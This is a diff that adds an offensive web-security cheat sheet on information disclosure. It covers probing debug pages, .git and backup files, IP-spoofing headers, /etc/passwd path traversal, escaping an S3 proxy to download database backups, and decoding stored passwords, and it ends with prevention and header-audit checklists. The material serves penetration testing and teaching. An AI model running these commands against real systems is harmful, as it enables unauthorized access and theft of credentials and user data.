@@ -1,0 +1,1028 @@
+# Information Disclosure Quick Reference
+
+## Attack Vectors Checklist
+
+### 1. Error Messages
+```
+□ Trigger type errors: productId="string"
+□ Try boundary values: id=-1, id=999999999
+□ Test special characters: id=', id=", id=%00
+□ Force exceptions: divide by zero, null references
+□ Test different parameters across all endpoints
+□ Analyze stack traces for:
+  - Framework names and versions
+  - File paths and directory structure
+  - Internal IP addresses
+  - Developer names/emails
+  - Database information
+```
+
+**Quick Exploit:**
+```http
+GET /product?productId="invalid" HTTP/1.1
+Host: target.com
+```
+
+---
+
+### 2. Debug Pages
+```
+□ Check HTML comments for debug references
+□ Test common debug paths
+□ Search for phpinfo() exposure
+□ Look for console/debug toolbars
+□ Check JavaScript files for debug code
+```
+
+**Common Debug Paths:**
+```
+/phpinfo.php
+/info.php
+/cgi-bin/phpinfo.php
+/debug
+/debug.php
+/test.php
+/console
+/_debug
+/dev
+/.env
+/config
+```
+
+**Quick Exploit:**
+```bash
+# Check for comments
+curl https://target.com | grep -i "debug\|todo\|fixme"
+
+# Test phpinfo
+curl https://target.com/phpinfo.php
+curl https://target.com/cgi-bin/phpinfo.php
+```
+
+---
+
+### 2b. JavaScript Source Review — Hidden API Discovery
+
+Modern web apps (React, Vue, Angular) embed API endpoints, secret commands, and auth logic in JS bundles. Always review them.
+
+```bash
+# Download all JS bundles from the page
+curl -s https://target.com | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//'
+
+# Search for API endpoints and secrets in JS
+curl -s https://target.com/static/js/main.js | grep -oiE '"/api/[^"]*"|fetch\("[^"]*"\)|secret|admin|hidden|flag'
+
+# Search for hardcoded credentials or tokens
+curl -s https://target.com/static/js/main.js | grep -oiE 'api[_-]?key|token|password|secret|bearer'
+```
+
+**Pattern:** Game/interactive apps often have a `/api/options` or `/api/config` endpoint that returns ALL available commands/routes, including hidden "secret" or "admin" ones not shown in the UI. Always check for:
+- `availableOptions['secret']` or `availableOptions['admin']` keys
+- Undocumented API routes in fetch() calls
+- Commented-out endpoints in source
+- Environment variables leaked in webpack bundles (`process.env.*`)
+
+---
+
+### 3. Backup Files
+```
+□ Check robots.txt for disallowed paths
+□ Test for directory listings
+□ Try common backup extensions
+□ Search for editor backup files
+□ Look for archived versions
+```
+
+**Backup Extensions:**
+```
+.bak
+.backup
+.old
+.orig
+.copy
+.save
+.tmp
+~
+.swp
+.swo
+_backup
+-old
+```
+
+**Quick Exploit:**
+```bash
+# Check robots.txt
+curl https://target.com/robots.txt
+
+# Test backup files
+curl https://target.com/index.php.bak
+curl https://target.com/config.php.old
+curl https://target.com/backup/
+
+# Directory listing
+curl https://target.com/backup/
+```
+
+---
+
+### 4. HTTP Method Disclosure
+```
+□ Test TRACE method
+□ Test TRACK method (IIS)
+□ Use OPTIONS to list methods
+□ Test HEAD vs GET differences
+□ Try DEBUG method
+```
+
+**Quick Exploit:**
+```http
+TRACE / HTTP/1.1
+Host: target.com
+
+# Or using curl
+curl -X TRACE https://target.com/admin -v
+```
+
+**Look for custom headers:**
+```
+X-Forwarded-For
+X-Real-IP
+X-Client-IP
+X-Custom-IP-Authorization
+X-Originating-IP
+CF-Connecting-IP
+True-Client-IP
+```
+
+---
+
+### 5. Version Control Exposure
+```
+□ Test for .git directory
+□ Check for .svn, .hg
+□ Download repository if accessible
+□ Scan commit history
+□ Search for secrets in old commits
+```
+
+**Quick Exploit:**
+```bash
+# Check for .git
+curl https://target.com/.git/config
+curl https://target.com/.git/HEAD
+
+# Download repository
+git-dumper https://target.com/.git/ output/
+
+# Search history
+git log -S "password" --all
+git log -p | grep -i "secret"
+```
+
+---
+
+### 6. Configuration Files
+```
+□ .env files
+□ config files
+□ web.config / .htaccess
+□ application.properties
+□ settings.py / config.php
+```
+
+**Common Paths:**
+```
+/.env
+/config.php
+/configuration.php
+/settings.py
+/web.config
+/app/config/database.yml
+/config/database.yml
+/.config
+/application.properties
+```
+
+---
+
+### 7. Comments & Metadata
+```
+□ HTML comments
+□ JavaScript comments
+□ CSS comments
+□ Source map files
+□ Metadata in documents
+```
+
+**Burp Suite Method:**
+```
+Target > Site map > Right-click domain
+> Engagement tools > Find comments
+```
+
+**Manual Method:**
+```bash
+# Search for comments
+curl https://target.com | grep -E "<!--.*-->"
+
+# Check source maps
+curl https://target.com/app.js.map
+```
+
+---
+
+## IP Spoofing Headers
+
+### Common Headers to Test
+```http
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Host: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+Forwarded: for=127.0.0.1
+```
+
+### Localhost Variations
+```
+127.0.0.1
+localhost
+::1
+0.0.0.0
+127.1
+0x7f.0x0.0x0.0x1
+2130706433
+```
+
+### Private IP Ranges
+```
+10.0.0.1
+172.16.0.1
+192.168.1.1
+192.168.0.1
+```
+
+---
+
+## Burp Suite Workflow
+
+### 1. Setup
+```
+Proxy > Options > Intercept Client Requests
+  □ Enable interception
+Target > Scope
+  □ Add target to scope
+```
+
+### 2. Discovery Tools
+```
+Target > Site map > Right-click
+  > Engagement tools > Find comments
+  > Engagement tools > Find scripts
+  > Engagement tools > Discover content
+  > Spider this host
+```
+
+### 3. Testing with Repeater
+```
+1. Send interesting request to Repeater
+2. Modify parameters/headers
+3. Analyze response differences
+4. Look for information leakage
+```
+
+### 4. Match and Replace (for header injection)
+```
+Proxy > Options > Match and Replace > Add
+
+Type: Request header
+Match: (leave empty)
+Replace: X-Custom-IP-Authorization: 127.0.0.1
+
+□ Enable rule
+```
+
+### 5. Intruder (for fuzzing)
+```
+Send request to Intruder
+Set payload positions: §parameter§
+Select payload type and list
+Start attack
+Analyze results for differences
+```
+
+---
+
+## Common Exploitation Payloads
+
+### Error Triggering
+```
+String instead of number: id="abc"
+Negative values: id=-1
+Null/undefined: id=null
+Special characters: id='
+Array notation: id[]
+Object notation: id{}
+Very large numbers: id=999999999999999
+```
+
+### Path Traversal for Info Gathering
+```
+/../../../etc/passwd
+/../../config.php
+/backup/../backup/config.php.bak
+```
+
+### Parameter Pollution
+```
+?id=1&id=2
+?id[]=1&id[]=2
+?id=1%00&id=2
+```
+
+---
+
+## Automated Scanning Tools
+
+### Web Scanners
+```bash
+# Nikto
+nikto -h https://target.com -C all
+
+# WPScan (WordPress)
+wpscan --url https://target.com --enumerate vp
+
+# Nuclei
+nuclei -u https://target.com -t exposures/
+
+# ffuf (directory fuzzing)
+ffuf -u https://target.com/FUZZ -w wordlist.txt
+```
+
+### Git Dumping Tools
+```bash
+# git-dumper
+pip install git-dumper
+git-dumper https://target.com/.git/ output/
+
+# GitTools
+git clone https://github.com/internetwache/GitTools
+./GitTools/Dumper/gitdumper.sh https://target.com/.git/ output/
+```
+
+### Secret Scanning
+```bash
+# truffleHog
+pip install truffleHog
+truffleHog filesystem /path/to/repo
+
+# gitleaks
+gitleaks detect --source /path/to/repo
+
+# git-secrets
+git secrets --scan
+```
+
+---
+
+## Quick Win Commands
+
+### One-Liner Checks
+```bash
+# Check robots.txt
+curl -s https://target.com/robots.txt
+
+# Check .git exposure
+curl -s https://target.com/.git/config && echo "GIT EXPOSED!"
+
+# Check phpinfo
+curl -s https://target.com/phpinfo.php | grep -i "php version"
+
+# Find comments
+curl -s https://target.com | grep -oP '<!--.*?-->'
+
+# Test TRACE
+curl -X TRACE https://target.com -v 2>&1 | grep -i "x-"
+
+# Check common backup files
+for ext in bak old backup; do curl -I https://target.com/index.php.$ext; done
+
+# Test debug paths
+for path in debug phpinfo info test dev console; do
+  curl -I https://target.com/$path.php 2>&1 | grep "200 OK" && echo "Found: $path.php"
+done
+```
+
+---
+
+## Information to Extract
+
+### From Error Messages
+- Framework name and version
+- Programming language
+- File paths and directory structure
+- Database type and version
+- Server operating system
+- Internal IP addresses
+- Developer usernames/emails
+
+### From Debug Pages
+- Environment variables
+- Configuration settings
+- Database credentials
+- API keys and tokens
+- Session secrets
+- File system paths
+- Loaded modules/libraries
+- PHP/server configuration
+
+### From Backup Files
+- Source code logic
+- Hard-coded credentials
+- API endpoints
+- Database schema
+- Business logic
+- Authentication mechanisms
+- Encryption keys
+
+### From Version Control
+- Complete source code history
+- Removed secrets
+- Developer information
+- Commit messages
+- Deleted files
+- Configuration history
+- Team structure
+
+### From Headers
+- Server version
+- Framework information
+- Load balancer details
+- CDN configuration
+- Custom internal headers
+- Security mechanisms
+
+---
+
+## Response Analysis Checklist
+
+### Status Codes
+```
+200 - Information disclosed
+401/403 - Access control implemented (test bypasses)
+404 - Not found (but check response body)
+405 - Method not allowed (try other methods)
+500 - Server error (good for information leakage)
+```
+
+### Response Headers
+```
+□ Server: Apache/2.4.41 (reveals version)
+□ X-Powered-By: PHP/7.4.3
+□ X-AspNet-Version
+□ X-Framework
+□ Custom X-* headers
+□ Set-Cookie attributes
+```
+
+### Response Body
+```
+□ Stack traces
+□ Framework error pages
+□ Directory listings
+□ Debug information
+□ Console outputs
+□ SQL queries
+□ File paths
+□ Version numbers
+```
+
+### Response Timing
+```
+□ Different timing = different code paths
+□ Useful for user enumeration
+□ Database query variations
+□ Resource existence checks
+```
+
+---
+
+## Burp Suite Extensions for Info Disclosure
+
+### Recommended Extensions
+```
+□ Logger++ - Enhanced logging
+□ Param Miner - Find hidden parameters
+□ Retire.js - Identify vulnerable JS libraries
+□ Software Version Reporter - Detect software versions
+□ Error Message Checks - Find verbose errors
+□ Git Digger - Find .git exposure
+□ Backslash Powered Scanner - Advanced testing
+```
+
+---
+
+## Fuzzing Wordlists
+
+### Backup File Extensions
+```
+bak
+backup
+old
+orig
+copy
+save
+tmp
+~
+swp
+swo
+_backup
+-old
+.1
+.2
+```
+
+### Debug Path Wordlist
+```
+phpinfo.php
+info.php
+test.php
+debug.php
+dev.php
+console.php
+admin.php
+configuration.php
+config.php
+settings.php
+_debug
+_test
+```
+
+### Backup Directory Wordlist
+```
+backup
+backups
+old
+bak
+archive
+temp
+tmp
+_backup
+.backup
+site-backup
+www-backup
+backup-2023
+backup-2024
+```
+
+---
+
+## Common Framework Indicators
+
+### From Error Messages
+```
+Apache Struts 2 -> Java application
+Laravel -> PHP application
+Django -> Python application
+Spring Boot -> Java application
+Express.js -> Node.js application
+Ruby on Rails -> Ruby application
+ASP.NET -> Microsoft stack
+```
+
+### From Headers
+```
+X-Powered-By: Express -> Node.js/Express
+X-Powered-By: PHP/7.x -> PHP
+Server: Apache Tomcat -> Java
+X-AspNet-Version -> ASP.NET
+X-Rails-* -> Ruby on Rails
+```
+
+---
+
+## Exploitation Priority
+
+### High Priority (Easy Wins)
+1. ✅ Check robots.txt
+2. ✅ Test TRACE method
+3. ✅ Check /.git/config
+4. ✅ Trigger error with invalid input
+5. ✅ Check common debug paths
+
+### Medium Priority
+6. Test backup file extensions
+7. Fuzz for hidden directories
+8. Analyze all comments
+9. Test IP spoofing headers
+10. Check for .env files
+
+### Advanced
+11. Download and analyze .git history
+12. Deep source code analysis
+13. Framework-specific exploits
+14. Chaining multiple disclosures
+15. Business logic analysis
+
+---
+
+## Real-World Examples
+
+### CVE Examples Related to Information Disclosure
+```
+CVE-2017-5638 - Apache Struts 2 (RCE due to version disclosure)
+CVE-2019-0604 - SharePoint (Information disclosure to RCE)
+CVE-2021-41773 - Apache HTTP Server (Path traversal + disclosure)
+```
+
+### Famous Incidents
+- GitHub Enterprise SSH key disclosure
+- Facebook access token exposure
+- Uber .git repository exposure
+- Capital One AWS metadata disclosure
+
+---
+
+## Prevention Quick Checklist
+
+### Code Level
+```
+□ No hardcoded secrets
+□ Generic error messages in production
+□ No debug code in production
+□ Use environment variables
+□ Sanitize all output
+```
+
+### Configuration Level
+```
+□ Disable display_errors in PHP
+□ Custom error pages (400, 403, 404, 500)
+□ Disable verbose stack traces
+□ Remove X-Powered-By headers
+□ Disable directory listings
+```
+
+### Server Level
+```
+□ Block .git directory access
+□ Block backup file extensions
+□ Block debug paths
+□ Disable TRACE method
+□ Remove default pages
+□ Disable server version banner
+```
+
+### Process Level
+```
+□ Pre-commit hooks for secrets
+□ Automated secret scanning in CI/CD
+□ Regular security audits
+□ Code review for info disclosure
+□ Penetration testing
+□ Security training for developers
+```
+
+---
+
+## Testing Checklist for Each Endpoint
+
+For every discovered endpoint, test:
+
+```
+□ Invalid parameter types
+□ Negative values
+□ Very large values
+□ Special characters
+□ Null/empty values
+□ Array/object notation
+□ TRACE method
+□ OPTIONS method
+□ Different HTTP methods (POST, PUT, DELETE)
+□ Missing authentication
+□ Header injection
+□ Response timing differences
+```
+
+---
+
+## Documentation Template
+
+When you find information disclosure, document:
+
+```markdown
+## Information Disclosure Finding
+
+**Endpoint:** /api/product?id=1
+**Method:** GET
+**Severity:** High/Medium/Low
+
+**Description:**
+[What information is disclosed]
+
+**Steps to Reproduce:**
+1. Navigate to...
+2. Send request with...
+3. Observe...
+
+**Payload:**
+```http
+[Exact request]
+```
+
+**Response:**
+```http
+[Relevant response excerpt]
+```
+
+**Disclosed Information:**
+- Framework: Apache Struts 2.3.31
+- Known CVE: CVE-2017-5638
+
+**Impact:**
+[Business impact]
+
+**Recommendation:**
+[How to fix]
+
+**References:**
+- [CVE links]
+- [Documentation]
+```
+
+---
+
+## Quick Reference URLs
+
+### Web Security Reference
+- https://portswigger.net/web-security/information-disclosure
+
+### OWASP
+- https://owasp.org/www-project-web-security-testing-guide/
+
+### Tools
+- Burp Suite: https://portswigger.net/burp
+- git-dumper: https://github.com/arthaud/git-dumper
+- truffleHog: https://github.com/trufflesecurity/trufflehog
+
+---
+
+*This cheat sheet provides quick reference for identifying and exploiting information disclosure vulnerabilities.*
+
+---
+
+## Comprehensive Security Headers Audit
+
+**MANDATORY for every engagement.** Check ALL response headers, not just the "big 3" (HSTS, CSP, CORS). Missing headers are findings.
+
+### Transport Security
+```
+□ Strict-Transport-Security (HSTS) — MUST be present on HTTPS sites
+  Expected: max-age=31536000; includeSubDomains; preload
+  Severity if missing: Medium (High if HTTP port is open)
+  NOTE: If HTTP port (80) is closed, severity is reduced — the downgrade attack requires an initial HTTP connection
+□ HTTPS enforcement — test if HTTP port 80 is open and redirects to HTTPS
+```
+
+### Caching (critical for authenticated/sensitive responses)
+```
+□ Cache-Control on API responses — MUST be no-store on sensitive data
+  Expected: Cache-Control: no-store, no-cache, must-revalidate
+  Also check: Pragma: no-cache (for HTTP/1.0 clients)
+  Test: check card numbers, PII, financial data, auth tokens in responses
+  Severity if missing: Medium (sensitive data persists in browser/proxy cache after logout)
+  Compliance: PCI DSS 6.5.3 (insecure data storage)
+```
+
+### Information Disclosure Headers (suppress in production)
+```
+□ Server — should not reveal product/version (e.g., "Apache/2.4.41" or "Microsoft-IIS/10.0")
+  Expected: Suppress entirely or use generic value
+□ X-Powered-By — should be removed (e.g., "ASP.NET", "Express", "PHP/7.4")
+□ X-AspNet-Version — should be removed
+□ X-AspNetMvc-Version — should be removed
+□ Api-Supported-Versions — should not be exposed to unauthenticated users
+□ X-Generator — should be removed (reveals CMS/framework)
+  Severity: Low (aids reconnaissance, not directly exploitable)
+```
+
+### Content Security
+```
+□ Content-Security-Policy (CSP) — check for completeness:
+  - script-src: no 'unsafe-inline' or 'unsafe-eval'
+  - base-uri: MUST be 'self' (missing allows <base> injection for CSP bypass)
+  - object-src: MUST be 'none' (prevents Flash/plugin-based attacks)
+  - form-action: should restrict form submission targets
+  - frame-ancestors: should be 'none' or 'self'
+□ X-Content-Type-Options: nosniff — prevents MIME sniffing
+□ X-Frame-Options — must be consistent with CSP frame-ancestors
+  If CSP has frame-ancestors 'none', X-Frame-Options should be DENY (not SAMEORIGIN — contradiction)
+```
+
+### Privacy & Referrer
+```
+□ Referrer-Policy — prevents URL parameter leakage to third parties
+  Expected: strict-origin-when-cross-origin (or stricter)
+  Impact: OAuth tokens, session IDs, or sensitive parameters in URLs leak via Referer header
+□ Permissions-Policy — restricts browser feature access
+  Expected: camera=(), microphone=(), geolocation=(), payment=() (restrict unused features)
+```
+
+### Vulnerability Disclosure
+```
+□ /.well-known/security.txt — public vulnerability reporting channel
+  Informational finding if missing (best practice, not a vulnerability)
+```
+
+### Cookie Security (check ALL cookies)
+```
+□ HttpOnly flag — prevents JavaScript access to session cookies
+□ Secure flag — ensures cookies only sent over HTTPS
+□ SameSite attribute — prevents CSRF (Lax or Strict)
+□ Domain scope — should not be set too broadly (e.g., .example.com leaks to subdomains)
+□ Cookie names — avoid internal hostname leakage in cookie names (e.g., ARRAffinity cookie revealing Azure app service names)
+```
+
+### Quick Header Audit Script
+```bash
+# Full header audit — run against main page and API endpoints
+URL="https://target.com"
+echo "=== Security Headers Audit ==="
+HEADERS=$(curl -sI "$URL")
+for h in "Strict-Transport-Security" "Content-Security-Policy" "X-Content-Type-Options" \
+         "X-Frame-Options" "Referrer-Policy" "Permissions-Policy" "Cache-Control"; do
+  echo "$HEADERS" | grep -qi "$h" && echo "[PASS] $h" || echo "[MISS] $h"
+done
+echo "=== Disclosure Headers (should be absent) ==="
+for h in "Server:" "X-Powered-By" "X-AspNet-Version" "X-AspNetMvc-Version" "Api-Supported-Versions"; do
+  echo "$HEADERS" | grep -qi "$h" && echo "[LEAK] $h: $(echo "$HEADERS" | grep -i "$h")" || echo "[OK] $h not disclosed"
+done
+```
+
+---
+
+## Client-Side Storage Security Audit
+
+### Browser Storage Mechanisms to Check
+```
+□ localStorage — persists indefinitely, survives browser close
+  Risk: auth tokens, PII, session data stored here are accessible to any JS on the same origin
+  Finding if: tokens (JWT, API keys, session IDs) are stored in localStorage instead of sessionStorage or httpOnly cookies
+□ sessionStorage — cleared when tab closes (acceptable for non-sensitive session data)
+□ IndexedDB — check for sensitive data in structured storage
+□ Cookies without HttpOnly — accessible via JavaScript (document.cookie)
+```
+
+### Detection via JavaScript Bundle Analysis
+Search minified/beautified JS for:
+```
+localStorage.setItem
+localStorage.getItem
+sessionStorage.setItem
+window.localStorage
+.storeLocal(
+setItem("token"
+setItem("tkn"
+setItem("jwt"
+setItem("auth"
+setItem("session"
+setItem("user"
+```
+
+### Why This Matters
+- localStorage data persists after logout if not explicitly cleared
+- Shared/public computers: next user can extract stored tokens
+- XSS escalation: even without httpOnly cookies, localStorage tokens are accessible via `document.cookie` alternatives
+
+---
+
+## Multi-Port and Backend Service Discovery
+
+### Alternate Port Scanning
+
+**Always probe for additional services on non-standard ports.** Many applications expose backend services (object storage, databases, APIs, admin panels) on alternate ports behind the same host.
+
+```bash
+# Quick port scan for common service ports
+for port in 80 443 3000 4000 5000 8000 8080 8333 8443 8888 9000 9090 9200 27017; do
+  curl -s -o /dev/null -w "[Port $port] HTTP %{http_code}\n" "http://TARGET:$port/" --connect-timeout 2
+done
+```
+
+**Docker/container environments** commonly expose multiple services via separate ports on the same host (e.g., nginx proxying to both a frontend and a storage backend).
+
+### S3 / Object Storage Enumeration
+
+When you discover an S3-compatible service (port 8333, 9000/MinIO, or custom):
+
+```bash
+# List all buckets (S3 ListBuckets API — GET /)
+curl -s http://TARGET:PORT/ | xmllint --format -
+
+# List objects in a bucket (S3 ListObjects API — GET /bucket-name)
+curl -s http://TARGET:PORT/BUCKET_NAME | xmllint --format -
+
+# Download a specific object
+curl -s http://TARGET:PORT/BUCKET_NAME/KEY -o output_file
+```
+
+**Common bucket names to enumerate:**
+```
+assets, backups, backup, data, db, database, dump, dumps, exports,
+files, images, internal, logs, media, private, public, secrets,
+static, storage, temp, uploads, users
+```
+
+**Accessing storage through application proxy endpoints (when direct S3 port is not accessible):**
+
+If the app serves files through a proxy (e.g., `<img src="/api/s3/photo.jpg">`), use URL-encoded path traversal to escape the intended bucket:
+```bash
+# Traverse from assets/ to backups/ bucket
+curl http://target/api/s3/..%2Fbackups%2Fdatabase.db -o database.db
+
+# Fuzz bucket/file combinations
+for bucket in backups backup data db; do
+  for file in app.db database.db backup.db users.db dump.sql; do
+    SIZE=$(curl -s "http://target/api/s3/..%2F${bucket}%2F${file}" | wc -c)
+    [ "$SIZE" -gt 100 ] && echo "[+] $bucket/$file: $SIZE bytes"
+  done
+done
+```
+See `server-side/reference/ssrf-quickstart.md` for the full proxy SSRF technique.
+
+**What to look for in storage buckets:**
+- Database backups (`.db`, `.sql`, `.dump`, `.bak`) — extract credentials, user data
+- Configuration files (`.env`, `.yml`, `.json`, `.conf`) — extract secrets, API keys
+- Source code archives (`.tar.gz`, `.zip`) — review for vulnerabilities
+- Log files — extract session tokens, internal paths
+- Private keys (`.pem`, `.key`) — direct authentication
+
+### Database Backup Extraction
+
+When a database file is found in object storage or backup directories:
+
+```bash
+# SQLite
+sqlite3 downloaded.db ".tables"
+sqlite3 downloaded.db "SELECT * FROM users;"
+
+# MySQL dump
+mysql -u root < dump.sql
+
+# Check for password encoding patterns
+# Base64-encoded passwords: decode to get raw password
+echo "BASE64_PASSWORD" | base64 -d
+```
+
+**Password storage patterns to recognize:**
+- **Plain base64**: `base64(raw_password)` — decode directly
+- **Hex encoding**: `hex(raw_password)` — convert with `xxd -r -p`
+- **MD5/SHA hashes**: crack with hashcat/john
+- **bcrypt/scrypt**: brute-force only (slow)
+- **Double encoding**: `base64(escape(raw_password))` — decode base64 first, then un-escape HTML entities
+
+---
+
+## Advanced Information Disclosure Patterns
+
+### Source Code Discovery
+
+**Trigger**: Initial reconnaissance on any web application
+
+**Technique**: Check common backup/source paths immediately
+```bash
+curl -I https://target.com/static/source_code.tar.gz
+curl -I https://target.com/backup.zip
+curl -I https://target.com/.git/HEAD
+```
+
+**Common Paths**:
+- `/static/source_code.*`
+- `/backup/`
+- `/.git/`
+- `/.env`
+- `/app.zip`
+- `/config.php.bak`
+
+**Verification**: Download and extract source code
+
+**Related**: Directory brute-forcing, Git repository dumping, info disclosure
+
+**Reference**: Found in numerous web applications during initial reconnaissance
+
+**Quick Script**:
+```bash
+#!/bin/bash
+TARGET="$1"
+for path in /static/source_code.tar.gz /backup.zip /.git/HEAD /.env /app.zip /config.php.bak; do
+  echo "[*] Testing: $TARGET$path"
+  curl -I -s "$TARGET$path" | head -1
+done
+```
+
+---
